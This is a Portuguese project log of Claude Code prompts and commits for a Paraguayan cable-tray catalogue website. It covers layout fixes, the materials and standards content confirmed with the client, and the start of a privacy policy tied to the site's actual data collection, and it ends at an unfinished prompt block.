**Ressalva do passo 2:** isso acopla a exibição do texto à primeira regra de
espessura. Vale porque hoje as 22 notas são idênticas e falam de ancho ≥500. Se
um dia entrar uma nota que não seja sobre ancho, ela vai sumir sem motivo — e o
lugar de arrumar é aqui.

**Commit:** `feat: ficha mais curta — espesor contextual y diagramas a la izquierda`

---

## 17. O item 9 levou duas coisas que não estavam em outro lugar (31/08)

A Yuki notou logo depois de rodar o 9: "parece que perdeu info". Está certa, e é
específico. Auditando o que saiu contra o que existe hoje no site:

**Perdido de verdade:**

- **As normas.** Estavam num array escrito à mão dentro do JSX da ficha e em
  nenhum outro lugar. `/materiales-y-tratamientos` tem Materia prima,
  Tratamientos superficiales, Espesores y tolerancia, Unión CLINCH e FAQ — **não
  tem normas**. Ou seja: repetidas 36 vezes viraram zero.
- **`unidadVenta`.** Existe em 3 produtos no `catalog.json` ("Tramo 3 m", "Kit",
  "Tramo 3 m") e depois do 9 não é renderizado em lugar nenhum. É informação da
  peça, não global — e importa na hora de cotar, porque muda o que a quantidade
  significa.

**Não perdido:** materia prima, tratamentos, espesores e tolerancia, proceso de
unión — tudo isso está na página de materiales. Familia está no breadcrumb e na
tag da ficha.

**O erro foi meu, e é de método:** o item 9 dizia "a página de materiales já diz
tudo isso uma vez". Eu não verifiquei o destino antes de mandar remover a origem.
A regra que fica: **antes de tirar conteúdo apontando para outro lugar, abrir o
outro lugar.**

### Prompt pro Claude Code

```
O item 9 removeu as abas da ficha, e com elas duas informações que não existem
em nenhum outro lugar do site. Recolocar cada uma onde ela pertence.

1. Normas — na página de materiales, uma vez
   Em app/materiales-y-tratamientos/page.jsx, acrescentar uma seção "Normas de
   referencia" depois de "Espesores y tolerancia", no mesmo padrão visual das
   outras seções (h2 font-brand text-base, card branco com border-border-subtle).
   Lista:
     IEC 61537 — Cable management systems: Cable tray systems and cable ladder systems
     ABNT NBR 6323 — Galvanização por imersão a quente de produtos de aço e ferro fundido
     NBR 7008 — Chapa de aço revestida de zinco pelo processo de imersão a quente
     ASTM A240 — Stainless Steel Plate, Sheet, and Strip for Pressure Vessels
     ASTM B209 — Aluminum and Aluminum-Alloy Sheet and Plate
   O código da norma em font-mono text-text-primary, a descrição em
   text-text-secondary.

2. Unidad de venta — na ficha, junto da quantidade
   Em app/catalogo/[categoria]/[produto]/ProductSheet.jsx: quando
   product.unidadVenta existir, mostrar o valor como linha discreta logo abaixo
   do seletor de quantidade, no formato "Unidad de venta: {valor}" em
   text-[11px] text-text-muted. Só nos produtos que têm o campo (hoje 3 de 36).

3. A linha de link que o item 9 criou passa a dizer também as normas:
   "Materiales, tratamientos y normas — iguales para toda la línea · Ver detalle →"
   (se já estiver com esse texto, não mexer).

Rode `npm run build` no final.
```

**Para o Akira, não para o código:** `ASTM B209` é norma de alumínio, e a matéria-
prima do catálogo é aço SAE 1006/1010 e inox AISI 304. Pode ser resíduo da
listagem antiga. Confirmar com ele antes de publicar.

**Commit:** `fix: normas en la página de materiales y unidad de venta en la ficha`

---

## 18. A ficha é a página mais estreita do site (31/08)

**Medido:** `app/catalogo/[categoria]/[produto]/page.jsx` usa `max-w-4xl` (896px)
com `px-4`. `/catalogo` e as páginas de família usam 1180px com `px-6`. Navegando
de uma família para uma ficha, o container encolhe quase 300px sem motivo — e a
ficha é justamente a página com mais controle na tela.

**Correção de um número que eu dei errado no item 16:** eu disse que a coluna
direita tinha ~880px. Com `max-w-4xl` menos a coluna de 260px da imagem, ela tem
~580px. O aperto que a Yuki sentiu era real e mensurável.

**O que a largura compra em altura** (é disso que se trata, não de estética):

- **Grid dos eixos:** ancho tem 14 valores e o código limita a 6 colunas → 3
  linhas de botões. Com a coluna larga, cabem em uma linha. ~60px, e a pessoa vê
  todas as medidas de uma vez em vez de varrer três linhas.
- **SKU composto e "pieza a medida"** passam a caber lado a lado: ~60px.
- Material/espessor e a descrição curta quebram menos.

**O que NÃO acompanha a largura:** descrição longa e FAQ já têm `max-w-3xl`
próprio e continuam assim. Linha de leitura larga demais cansa; alargar o
container não pode alargar o texto.

### Prompt pro Claude Code

```
A ficha de produto é a única página do site em max-w-4xl (896px); o resto usa
1180px. Alinhar, e usar a largura ganha para encurtar a coluna de configuração.

1. app/catalogo/[categoria]/[produto]/page.jsx
   O container passa de "max-w-4xl mx-auto px-4 py-6" para
   "max-w-[1180px] mx-auto px-6 py-8", igual às páginas de família.
   Não mexer no max-w-3xl da descrição longa nem no da FAQ — o texto continua
   estreito de propósito.

2. app/catalogo/[categoria]/[produto]/ProductSheet.jsx — coluna da imagem
   O grid passa de md:grid-cols-[260px_1fr] para md:grid-cols-[320px_1fr].
   Os renders são deitados (mediana 1,42) e com 320px a peça aparece maior sem
   o frame ficar mais alto.

3. Grid dos seletores de eixo
   Hoje: repeat(Math.min(ax.values.length, 6), minmax(0, 1fr)).
   Passa a: repeat(auto-fill, minmax(52px, 1fr)) — os botões mantêm largura
   parecida e o número de colunas segue o espaço disponível. Com a coluna larga,
   os 14 valores de ancho cabem numa linha; no mobile continua quebrando.

4. SKU composto + "pieza a medida" lado a lado a partir de md
   Os dois blocos viram um grid md:grid-cols-2 gap-3 (empilhados no mobile).
   Quando só um dos dois existir, ele ocupa a largura toda — nada de coluna
   vazia.

Não mexer na ordem dos seletores nem nos CTAs. Rode `npm run build` no final.
```

**Como conferir:** navegar de `/catalogo/bandejas` para uma ficha — o container
não pode mudar de largura. Os 14 valores de ancho em uma linha só no desktop. O
texto longo continua estreito.

**Commit:** `feat: ficha na largura do resto do site, configurador mais curto`

---

## 19. Normas em tabela, e as correções do Akira — DESTRAVADO (31/08)

A seção de normas criada no item 17 é uma linha corrida por norma, e está ruim de
ler. Duas coisas a resolver juntas:

**Layout:** virar tabela de três colunas — `Norma · Alcance · Aplica a` —, no
padrão da tabela de materiales da página de família.

**Idioma:** as descrições estão em três idiomas num site em espanhol — inglês no
IEC e no ASTM, português no NBR. Reescrever o "Alcance" em espanhol.

**Do Akira (31/08):**
- `ASTM B209` é de alumínio → **remover**.
- SAE 1006/1010 é aço; serve para aço comum ou galvanizado.
- AISI 304 e AISI 316 são a nomenclatura técnica das duas classes de inox.

**Destravado:** o Akira confirmou que a BGA trabalha com AISI 316. Isso vira o
item 20 (material no catálogo) e **roda antes deste**, porque a coluna "Aplica a"
passa a citar os dois inox.

**Tabela final** — o "Aplica a" é dedução a partir da explicação do Akira; vale
ele bater o olho quando responder o `ambiente` do 316 (item 20):

| Norma | Alcance | Aplica a |
| --- | --- | --- |
| IEC 61537 | Sistemas de canalización: bandejas y escaleras portacables | Todo el sistema |
| ABNT NBR 6323 | Galvanizado por inmersión en caliente | Tratamiento GF |
| NBR 7008 | Chapa de acero revestida de zinc por inmersión | Chapa pregalvanizada (PZ) |
| ASTM A240 | Chapa y fleje de acero inoxidable | AISI 304 y 316 |

### Prompt pro Claude Code

```
A seção "Normas de referencia" de app/materiales-y-tratamientos/page.jsx é hoje
uma linha corrida por norma, difícil de ler, e as descrições estão em três
idiomas (inglês no IEC e no ASTM, português no NBR) num site em espanhol.

Trocar por uma tabela de três colunas, no mesmo padrão da tabela de materiales
da página de família (thead em bg-surface-elevated, divide-y divide-border-subtle,
card branco com border-border-subtle, text-xs):

  Norma            | Alcance                                                    | Aplica a
  IEC 61537        | Sistemas de canalización: bandejas y escaleras portacables  | Todo el sistema
  ABNT NBR 6323    | Galvanizado por inmersión en caliente                       | Tratamiento GF
  NBR 7008         | Chapa de acero revestida de zinc por inmersión              | Chapa pregalvanizada (PZ)
  ASTM A240        | Chapa y fleje de acero inoxidable                           | AISI 304 y 316

O código da norma em font-mono text-text-primary; as outras colunas em
text-text-secondary.

ASTM B209 sai — é norma de alumínio e a matéria-prima do catálogo é acero
SAE 1006/1010 e inoxidable AISI 304/316 (confirmado pelo Akira em 31/08).

Rode `npm run build` no final.
```

**Commit:** `content: normas en tabla, en español, sin la norma de aluminio`

---

## 20. AISI 316 entra no catálogo (31/08, confirmado pelo Akira)

**Akira confirmou:** a BGA trabalha com inox AISI 316 além do 304. E `ASTM B209`
(alumínio) sai da lista de normas.

**Decidido:** o destaque do inox é **no conteúdo, não na ordem dos chips**. O
padrão do distribuidor é o aço; pôr o inox primeiro no configurador faria a
maioria varrer para achar o que sempre usa, e o chip default (SAE) deixaria de
ser o primeiro. O que rende é a frase — hoje "acero inoxidable AISI 304" aparece
de passagem, no fim de uma lista, e que a BGA faça 304 **e** 316 é informação
nova para quem especifica ambiente agressivo.

**Alcance levantado antes de escrever — é menor do que parece:**

- o parágrafo que cita AISI 304 é **idêntico nos 36** `longDescription`: um
  find/replace resolve os 36;
- o material entra no SKU por um mapa em `lib/products.js`
  (`{ sae1006, aisi304, alum1100 }`): mais uma linha;
- **o carrinho não quebra** — o id da linha é o SKU composto e nenhum id
  existente muda. Não precisa virar a chave do `localStorage`.

### Prompt pro Claude Code

```
Incluir o acero inoxidable AISI 316 no catálogo, e dar ao inox o destaque que
ele não tem hoje na descrição.

1. lib/catalog.json — globalSpecs.materials
   Acrescentar { "id": "aisi316", "name": "Acero inoxidable AISI 316" } depois
   do aisi304. Não mexer no default (segue sae1006).

2. lib/products.js — buildComposedSKU
   No mapa de nomes, acrescentar aisi316: 'AISI316'.

3. lib/catalog.json — os 36 longDescription
   O parágrafo abaixo é idêntico nas 36 fichas; trocar em todas:

   DE:
   "Disponible en chapa pregalvanizada (PZ), chapa negra (CN) y acero inoxidable
   AISI 304, con galvanizado por inmersión en caliente (GF) o pintura
   electrostática para exterior."

   PARA:
   "Disponible en chapa pregalvanizada (PZ) y chapa negra (CN), con galvanizado
   por inmersión en caliente (GF) o pintura electrostática para exterior.
   También en acero inoxidable AISI 304 y AISI 316."

   O inox ganha frase própria em vez de ficar no fim de uma lista. Nenhuma
   afirmação de aplicação nova — a diferença entre 304 e 316 é do Akira, e entra
   pela tabela do passo 4.

4. lib/catalog.json — materialTable da família bandejas
   Acrescentar a linha do 316 depois da do 304:
   material: "Acero inoxidable AISI 316"
   tratamiento: "Sin tratamiento adicional"
   ambiente: "PENDIENTE — confirmar con Akira"
   norma: "ASTM A240"
   Deixar o texto de "ambiente" literalmente assim; é conteúdo do cliente e não
   pode ser inventado.

5. app/materiales-y-tratamientos/page.jsx
   Conferir se a seção "Materia prima" lê globalSpecs.materials. Se ler, o 316
   aparece sozinho e não há o que fazer. Se estiver escrito à mão, acrescentar.

6. Nas 2 FAQs de produto que citam AISI 304, conferir se a resposta continua
   correta com o 316 disponível; se a frase excluir outros inox por omissão,
   ajustar só essas duas.

Rode `npm run build` no final.
```

**Duas pendências que não são código:**

- **`ambiente` do 316 na tabela** — precisa da frase do Akira. Fica com
  "PENDIENTE" visível até ele responder; melhor um pendente à vista do que uma
  recomendação de ambiente inventada por nós num material que o cliente vende.
- **Quando o catálogo passar a vir do Sheet do cliente** (`googleSheetId` hoje é
  null), esta mudança precisa entrar lá também — ver
  `RUNBOOK-planilha-na-conta-do-cliente.md`.

**Commit:** `content: acero inoxidable AISI 316 y destaque del inox en la ficha`

---

## 21. Três defeitos que o item 18 revelou (31/08)

Achados pela Yuki testando a ficha do `kit-de-uniones` logo depois de rodar o 18.
Os três vêm de suposição minha não verificada, não de erro de implementação.

**1. A caixa de espessura aparece em ficha sem eixo `ancho`.** O item 16 mandava
"se não houver eixo ancho, manter a lista como está". Fallback errado: se a peça
não se especifica por ancho, a regra de ancho não é dela. Auditadas as 36, são
**3 fichas**: `kit-de-uniones` (só `ala`), `salida-horizontal-electroducto` e
`salida-lateral-perfilado` (**nenhum eixo** — a caixa lista três regras numa
página sem nada para escolher).

**2. Valor órfão no grid dos eixos.** O `repeat(auto-fill, minmax(52px,1fr))` do
item 18 cria quantas colunas couberem: com 14 valores deu 13 + 1. Os eixos têm 14
valores (26 fichas), 16 (6 fichas), 5, 3 e 1 — a sobra muda com o tamanho da
janela. Precisa de linhas equilibradas, não de "quantas couberem".

**3. A FAQ esticou.** O prompt do 18 dizia "não mexer no `max-w-3xl` da FAQ" — a
FAQ nunca teve; só a descrição longa tinha. Com o container em 1180, os cards
foram para ~1130px de largura.

**Regra que fica, e é a terceira vez nesta sessão:** antes de escrever "manter o
que já existe", abrir e confirmar que existe. Foi o mesmo erro do item 17 (linkar
para uma página que não tinha as normas).

### Prompt pro Claude Code

```
Dois defeitos na ficha, achados depois do item 18.

1. A caixa "Espesor mínimo recomendado" aparece em fichas sem eixo ancho
   Em app/catalogo/[categoria]/[produto]/ProductSheet.jsx: só renderizar o bloco
   quando existir eixo 'ancho' em axesToShow E houver regra casando com o ancho
   selecionado. Sem eixo ancho, não renderizar nada — remover o fallback que
   mostra a lista completa (foi ele que causou isso).
   Afeta 3 fichas: kit-de-uniones, salida-horizontal-electroducto,
   salida-lateral-perfilado.

2. O grid dos eixos deixa valor sobrando sozinho na última linha
   O repeat(auto-fill, ...) do item 18 cria quantas colunas couberem, então 14
   valores viram 13 + 1. Trocar por linhas equilibradas, calculadas no
   componente:
     const rows = Math.ceil(n / 8)
     const cols = Math.ceil(n / rows)
   com n = ax.values.length. Isso dá 14 → 7+7, 16 → 8+8, 5 → 5, 3 → 3, 1 → 1.
   Aplicar como:
     style={{ '--axis-cols': `repeat(${cols}, minmax(0, 88px))` }}
     className="grid grid-cols-5 md:[grid-template-columns:var(--axis-cols)] gap-1"
   O minmax com máximo de 88px evita o botão esticar quando há poucos valores;
   no mobile continuam 5 colunas fixas.

3. A FAQ da ficha esticou junto com o container
   Em app/catalogo/[categoria]/[produto]/page.jsx, a <section> da FAQ não tem
   limite de largura. Aplicar max-w-3xl no container dos cards, igual à
   descrição longa. O h2 acompanha.

Rode `npm run build` no final e confira a bandeja portacables (ancho de 14) e o
kit-de-uniones (só ala).
```

**Como conferir:** no Kit, a caixa amarela some. Na bandeja, os 14 anchos em duas
linhas de 7, e nenhum valor sozinho ao redimensionar a janela. A FAQ na mesma
largura da descrição longa.

**Commit:** vai junto com o item 18 — o 18 não foi commitado ainda, e commitar
sozinho gravaria um estado que já se sabe errado.

---

## 22. Conteúdo técnico do Akira sobre os materiais (31/08)

O Akira mandou descrição e ambiente recomendado dos quatro materiais, mais uma
tabela de referência de outro fabricante (em inglês, por combinação
material+tratamento). **A tabela serve para confirmar o mapeamento, não para
reproduzir no site** — é documento de terceiro.

**Confirmado por ele:** é **AISI 316**, não 316L (o L da tabela de referência não
vale para a BGA).

**O que isso preenche:**

- a seção "Materia prima" da página de materiales, que hoje é só o nome dentro de
  um card;
- a coluna `ambiente` do `materialTable` — inclusive o `PENDIENTE` do 316;
- a FAQ "¿Cuándo conviene acero inoxidable...?", que terminava em "El AISI 304
  cubre la mayoría de esos casos" sem dizer quando o 316 entra.

**Conflito ainda aberto — a chapa negra.** A tabela do site diz que CN é para
"Exterior / húmedo / corrosivo"; o texto do Akira diz "uso general en interiores,
siempre que reciba el tratamiento posterior"; e a tabela de referência que ele
mesmo mandou põe HDG (galvanizado por imersão) em exterior. Os três só se
reconciliam se **o ambiente for da combinação chapa + tratamento**, não da chapa.
Proposta enviada a ele: dividir a linha de CN em duas — CN + GF (exterior,
húmedo, corrosivo) e CN + pintura electrostática (uso general en interiores).
**Enquanto ele não confirma, a linha de CN fica como está.**

### Prompt pro Claude Code

```
Conteúdo novo do cliente (Akira, 31/08) sobre os materiais. Tudo abaixo são
palavras dele — não reescrever, não enfeitar.

1. lib/catalog.json — globalSpecs.materials ganha "description"
   sae1006: "Acero al carbono laminado. En chapa negra (CN) requiere tratamiento
   posterior obligatorio — galvanizado en caliente o pintura electrostática en
   polvo. En pregalvanizado (PZ) sale de fábrica con recubrimiento de zinc
   aplicado antes del conformado, y no requiere tratamiento adicional para uso
   interno."
   aisi304: "Acero inoxidable austenítico (aprox. 18% Cr / 8% Ni), con acabado
   inoxidable natural que no requiere pintura."
   aisi316: "Acero inoxidable austenítico con adición de molibdeno (2–3%),
   acabado inoxidable natural y mayor resistencia a la corrosión que el 304."

2. app/materiales-y-tratamientos/page.jsx — seção "Materia prima"
   Cada card passa a mostrar a description abaixo do nome, em text-xs
   text-text-secondary leading-relaxed. Card sem description não quebra.

3. lib/catalog.json — materialTable da família bandejas, coluna "ambiente"
   PZ  → "Interiores secos, sin exposición a humedad, agentes químicos o salinidad"
   304 → "Higiene exigente — alimenticia, farmacéutica, hospitalaria; interior y
          exterior sin exposición agresiva a cloruros"
   316 → "Exposición química, ambientes marinos o salinos, plantas químicas,
          ambientes ácidos o alcalinos y presencia de halógenos"
   A linha da chapa negra (CN) NÃO muda — está esperando confirmação do Akira
   sobre separar por tratamento.

4. lib/catalog.json — materialsPage.faq, a pergunta "¿Cuándo conviene acero
   inoxidable en lugar de acero galvanizado?"
   Resposta nova:
   "En ambientes químicamente agresivos, donde el zinc no alcanza. El AISI 304
   cubre la mayoría de esos casos: higiene exigente — industria alimenticia,
   farmacéutica y hospitalaria —, interior y exterior sin exposición agresiva a
   cloruros. El AISI 316 lleva molibdeno (2–3%) y resiste más: ambientes marinos
   o salinos, plantas químicas, ambientes ácidos o alcalinos y presencia de
   halógenos."

Rode `npm run build` no final.
```

**Como conferir:** a página de materiales mostra os três materiais com descrição
técnica, e a tabela da página de bandejas não tem mais `PENDIENTE`. A linha de CN
continua igual — é o único ponto ainda dependente do cliente.

**Commit:** `content: descripción técnica de materiales y ambientes, del cliente`

---

## 23. Dois defeitos achados em auditoria (31/08)

Nenhum dos dois aparece no uso normal da Yuki — por isso a auditoria.

**1. A escrita no `localStorage` não está protegida.** Em
`components/CartProvider.jsx` a leitura tem `try/catch`; a escrita
(`localStorage.setItem('bga-cart-v2', ...)`) não tem. Em navegador com storage
bloqueado ou cota estourada, o `setItem` lança — e como o provider embrulha o
site inteiro, o erro não fica contido no carrinho.

**2. `npm run dev` quebra em clone novo.** `lib/search-index.json` está no
`.gitignore` e só é gerado pelo `prebuild`, que roda antes do `build`, não do
`dev`. Na máquina da Yuki funciona porque o arquivo existe desde o item 7. Em
máquina nova, o `lib/search.js` importa um arquivo que não está lá e o dev não
sobe. O build de produção não é afetado.

### Prompt pro Claude Code

```
Dois defeitos de robustez, sem mudança visual.

1. components/CartProvider.jsx — proteger a escrita no localStorage
   O useEffect que faz localStorage.setItem('bga-cart-v2', ...) precisa de
   try/catch, igual à leitura logo acima. Storage bloqueado ou cota cheia não
   pode derrubar o provider, que embrulha o site inteiro. O carrinho segue
   funcionando em memória durante a sessão; só não persiste.

2. package.json — o índice de busca precisa existir também em dev
   Acrescentar "predev": "node scripts/build-search-index.mjs" ao lado do
   prebuild que já existe. Sem isso, clone novo + npm run dev falha, porque
   lib/search-index.json é gerado e está no .gitignore.

Rode `npm run build` no final.
```

**Como conferir:** `rm lib/search-index.json && npm run dev` tem que subir
normalmente (e recriar o arquivo).

**Commit:** `fix: localStorage a prueba de fallos y índice de búsqueda en dev`

---

## 24. A quantidade só tem + e −, sem digitar (31/08)

**O problema:** num distribuidor elétrico, pedir 80 peças ou 200 metros é
normal. Hoje isso são 80 cliques — na ficha e de novo no carrinho, que tem os
mesmos dois botões. A pessoa desiste e vai pro WhatsApp, onde ela **consegue**
escrever "80". O site empurra para fora exatamente quem tem pedido grande.

Não é bug: é o limite de um controle escolhido para ajuste fino sendo usado como
entrada de valor.

### Prompt pro Claude Code

```
A quantidade hoje só se ajusta por + e −, na ficha e no carrinho. Pedidos de
distribuidor são de dezenas ou centenas de unidades; precisa dar para digitar.

1. app/catalogo/[categoria]/[produto]/ProductSheet.jsx
   O <span> que mostra qty vira <input> digitável entre os dois botões:
   - type="text" inputMode="numeric" pattern="[0-9]*" (teclado numérico no
     celular sem as setinhas do type=number)
   - value={qty}, onChange aceitando só dígitos (descartar o resto), permitindo
     campo vazio enquanto a pessoa digita
   - onBlur normaliza: vazio ou 0 volta para 1; acima de 9999 vira 9999
   - largura fixa (w-14), text-center font-mono, mesma altura dos botões,
     borda só nas laterais para continuar parecendo um controle só
   - aria-label="Cantidad"
   Os botões + e − continuam, para ajuste de 1 em 1.

2. app/cotacao/page.jsx — mesmo tratamento na linha do carrinho
   O <span> da quantidade vira o mesmo input, chamando updateQuantity(lineId, n)
   no blur já normalizado. Manter os botões.

3. components/CartProvider.jsx — updateQuantity
   Hoje faz `if (qty < 1) return`. Passa a normalizar: número inválido ou < 1
   vira 1; acima de 9999 vira 9999. Assim a regra vale para quem chamar,
   inclusive o input.

Não mexer no formato da mensagem de WhatsApp nem no evento de GA4.
Rode `npm run build` no final.
```

**Como conferir:** digitar 250 na ficha, agregar, e ver 250 no carrinho e na
mensagem do WhatsApp. Apagar o campo e clicar fora tem que voltar para 1, nunca
ficar vazio ou NaN.

**Commit:** `feat: cantidad editable en la ficha y en el carrito`

---

## 25. Chapa negra sai do catálogo — o Akira respondeu (31/08)

A proposta que tinha ido pra ele (item 22) era **dividir** a linha de CN em duas:
CN + GF para exterior, CN + pintura para interior. Ele respondeu outra coisa —
não dividir, **tirar**. Nas palavras dele, em áudio:

> "Vamos tirar essa chapa negra, a gente deixa o aço carbono 1006/1010
> pregalvanizado como o material, e aí o aço inox AISI 304 e o AISI 316 como
> outra opção de material. E o revestimento — ou tratamento, é sinônimo — a gente
> coloca ali como opção: galvanizado caliente ou pintura eletrostática."

> "Não vou criar um cadastro todo de chapa negra, não faz sentido. Eu vou usar o
> padrão, que é o pregalvanizado; daí se ele quiser chapa negra a gente bota uma
> observação e dá um desconto — na prática é o que a gente acaba fazendo, porque
> eu não mantenho estoque desse material, ele oxida muito fácil."

> "O que talvez dê pra deixar é uma pequena observação de que é possível entregar
> só em chapa negra, se for exigência do cliente, mas aí ele pede especificamente
> pra vendedora."

**O que muda:** material passa a ser três — acero SAE 1006/1010 (entregue
pregalvanizado, padrão), AISI 304 e AISI 316. Galvanizado a fogo e pintura
eletrostática deixam de ser "o que se faz com a chapa negra" e passam a ser
**opções de tratamento sobre o mesmo aço carbono** — e são **só essas duas**
(confirmado pela Yuki em 31/08: são as duas marcadas, o resto da tabela de
tratamentos não é palavra dele). Chapa negra pura vira exceção sob pedido.

Consequência: o pregalvanizado sai da tabela de tratamentos, porque não é um
tratamento que se escolhe — é o estado com que o aço carbono sai de fábrica, e já
está dito na coluna Material. A pintura líquida sai porque nunca teve ambiente
nem norma e ele não a citou.

**O que isso confirma:** a regra do dia — *o ambiente recomendado é da combinação
chapa + tratamento* — continua valendo. Só que agora a coluna Material não muda
entre as linhas de aço carbono; o que muda é a coluna Tratamento. A tabela fica
mais fácil de ler exatamente por isso.

**Onde a exceção mora:** só na página de materiales. Repetir o aviso nas 36
fichas seria conteúdo genérico em 36 páginas — a regra que já custou o item 9. E
o canal para pedir já existe: o carrinho tem "Observación (opcional)" por linha,
que é literalmente o que o Akira descreve ("a gente bota uma observação").

### Prompt pro Claude Code

```
Resposta do cliente (Akira, 31/08): a chapa negra sai do catálogo como material.
Material passa a ser 3 — acero SAE 1006/1010 (entregue pregalvanizado por
padrão), AISI 304 e AISI 316 — e galvanizado en caliente e pintura electrostática
passam a ser opções de tratamento sobre o aço carbono. Entrega em chapa negra sem
tratamento continua possível como exceção, a pedido, falando com a vendedora.

É tudo conteúdo: não muda carrinho, SKU composto, localStorage nem GA4.

1. lib/catalog.json — globalSpecs.materials, sae1006.description
   "Acero al carbono laminado. Se entrega pregalvanizado (PZ): sale de fábrica
   con recubrimiento de zinc aplicado antes del conformado y no requiere
   tratamiento adicional para uso interior. Para exterior o ambiente húmedo
   recibe galvanizado por inmersión en caliente o pintura electrostática en
   polvo."
   aisi304 e aisi316 não mudam.

2. lib/catalog.json — categories.bandejas.materialTable
   A linha "Acero SAE 1006 chapa negra (CN)" sai. O aço carbono passa a ocupar
   três linhas — mesma matéria-prima, tratamento diferente — e as duas de inox
   continuam iguais, no fim da tabela:

   material   "Acero SAE 1006/1010 pregalvanizado (PZ)"
   tratamiento"Sin tratamiento adicional"
   ambiente   "Interiores secos, sin exposición a humedad, agentes químicos o salinidad"
   norma      "NBR 7008"

   material   "Acero SAE 1006/1010"
   tratamiento"Galvanizado por inmersión en caliente (GF)"
   ambiente   "Exterior, ambiente húmedo o mojado, o con agentes corrosivos"
   norma      "NBR 6323 / ASTM 123"

   material   "Acero SAE 1006/1010"
   tratamiento"Pintura electrostática en polvo"
   ambiente   "Interior y exterior, cuando además se busca color o acabado estético"
   norma      "—"

3. lib/catalog.json — globalSpecs.surfaceTreatments
   Fica com dois tratamentos, que são os dois que o cliente citou:

   { id: "gf",   name: "Galvanizado por Inmersión en Caliente",
     norm: "NBR 6323 / ASTM 123", useCase: "exteriores, ambientes húmedos" }
   { id: "elec", name: "Pintura Electrostática en Polvo",
     useCase: "interiores y exteriores, con color y acabado estético" }

   Saem "pz" (pregalvanizado não é tratamento que se escolhe: é o estado de
   fábrica do aço carbono, e já aparece na coluna Material) e "liq" (pintura
   líquida, que nunca teve useCase nem norm e renderizava "— —").
   `surfaceTreatments` só é lido em app/materiales-y-tratamientos/page.jsx —
   nenhum outro arquivo depende desses ids.

4. lib/catalog.json — categories.bandejas.richDescription
   Trocar "(pregalvanizada o chapa negra) o acero inoxidable AISI 304" por
   "pregalvanizada o en acero inoxidable AISI 304 y AISI 316".
   Reler a frase inteira depois da troca; o resto do parágrafo não muda.

5. lib/catalog.json — longDescription dos produtos
   O mesmo parágrafo aparece em 41 fichas, em duas variantes. As duas viram uma:

   sai (36x): "Disponible en chapa pregalvanizada (PZ) y chapa negra (CN), con
   galvanizado por inmersión en caliente (GF) o pintura electrostática para
   exterior. También en acero inoxidable AISI 304 y AISI 316."

   sai (5x): "Disponible en chapa pregalvanizada (PZ), chapa negra (CN) y acero
   inoxidable AISI 304, con galvanizado por inmersión en caliente (GF) o pintura
   electrostática para exterior."

   entra (nas 41): "Disponible en acero SAE 1006/1010 pregalvanizado (PZ) para
   interior, con galvanizado por inmersión en caliente (GF) o pintura
   electrostática para exterior. También en acero inoxidable AISI 304 y AISI 316."

   Nenhuma outra frase da longDescription muda.

6. lib/catalog.json — materialsPage.longDescription
   Os dois últimos parágrafos são boilerplate de ficha de produto que vazou pra
   esta página: o "Disponible en chapa pregalvanizada (PZ) y chapa negra (CN)…" e
   o "Fabricado en Paraguay por BGA Electric S.A. Se cotiza por ancho, ala,
   material, espesor y tratamiento…". Os dois saem — esta página não é ficha de
   produto, não tem ancho nem ala, e o conteúdo deles já está nas seções acima.
   Além disso, com o pregalvanizado fora da tabela de tratamentos, a explicação
   dele muda de parágrafo — o texto técnico continua o mesmo, só troca de lugar.
   O parágrafo "Materia prima: acero SAE 1006/1010 y acero inoxidable AISI 304 y
   AISI 316." passa a terminar com a frase que hoje abre o parágrafo dos
   tratamentos: "El acero al carbono se entrega pregalvanizado (PZ): inmersión
   continua de la chapa en zinc a 455 °C, hecha en la planta de producción de la
   chapa, según NBR 7008, para interior seco y atmósfera no agresiva." E o
   parágrafo dos tratamentos passa a começar direto no GF: "Tratamientos
   superficiales. El galvanizado por inmersión en caliente (GF) sumerge…".
   O resto do texto não muda.

7. app/materiales-y-tratamientos/page.jsx — a nota da chapa negra
   Na seção "Materia prima", logo depois do grid de cards e ainda dentro da
   <section>, uma nota de rodapé (não é card):

   <p className="text-xs text-text-muted leading-relaxed max-w-3xl mt-3">
     El estándar de fábrica es chapa pregalvanizada. La entrega en chapa negra
     sin tratamiento es posible como excepción, a pedido del cliente: no se
     mantiene en stock porque oxida con facilidad. Indicalo en la observación de
     tu cotización o consultá con la vendedora.
   </p>

   Só aqui. Não repetir nas fichas nem na página de família — a tabela da família
   já linka para esta página.

Rode `npm run build` no final.
```

**Como conferir:** `/materiales-y-tratamientos` não tem mais a palavra "negra" em
lugar nenhum a não ser na nota da seção "Materia prima"; a tabela de tratamentos
tem duas linhas, as duas com ambiente preenchido e nenhum "— —"; e a página
termina no CLINCH, sem o parágrafo de "se cotiza por ancho, ala". Em
`/catalogo/bandejas`, a tabela tem cinco linhas, e as três de aço carbono se
distinguem pela coluna Tratamento. Em qualquer ficha, o parágrafo de
disponibilidade começa por "Disponible en acero SAE 1006/1010 pregalvanizado".

**Commit:** `content: chapa negra sale del catálogo, tratamiento como opción`

---

## 26. Política de privacidade — o bloqueio vermelho antes de publicar (31/08)

Não existe política de privacidade neste projeto (item 11). É o único item que
impede publicar: o site coleta nome, RUC e rubro num formulário, grava numa
planilha do Google e mede com GA4, sem dizer isso em lugar nenhum.

**O texto abaixo não é genérico — foi escrito a partir do código.** Cada frase
corresponde a uma coleta que existe de verdade:

| O que a política afirma | Onde isso acontece no código |
| --- | --- |
| nombre/empresa, RUC, rubro | `form` em `app/cotacao/page.jsx` |
| lista de produtos, quantidades e observações | payload de `registrarCotizacion()` |
| telefone e nome de perfil | o `wa.me` abre a conversa com o número do visitante |
| páginas vistas, dispositivo, origem | GA4 `G-3PF2RG7WNG` em `components/Analytics.jsx` |
| a lista fica no navegador até enviar | `localStorage` do `CartProvider` |
| Google, Meta e AWS como terceiros | Apps Script + Sheets, `wa.me`, Amplify |

**Base legal:** o pedido de cotização é relação pré-contratual — a pessoa está
pedindo um orçamento. Não precisa de checkbox de consentimento nem de banner de
cookies para isso. O que precisa é **dizer**, no ponto da coleta, e é o que a
linha abaixo do botão faz.

**Sobre a lei:** o Paraguai promulgou a **Ley N° 7593/2025 de Protección de Datos
Personales** no fim de novembro de 2025, com período de adequação de 24 meses —
ou seja, exigibilidade plena por volta de novembro de 2027. Confirmar as datas no
texto oficial; a fonte aqui é análise de escritório, não a lei. Na prática: hoje
isso não é multa, é higiene — e escrever agora sai de graça, escrever depois de
um problema não.

**Isto não é parecer jurídico.** Não sou advogada; o texto descreve com precisão
o que o sistema faz, o que é a parte que costuma estar errada nas políticas
copiadas. Se a BGA tiver assessoria jurídica, mandar para revisão é barato.

### Prompt pro Claude Code

```
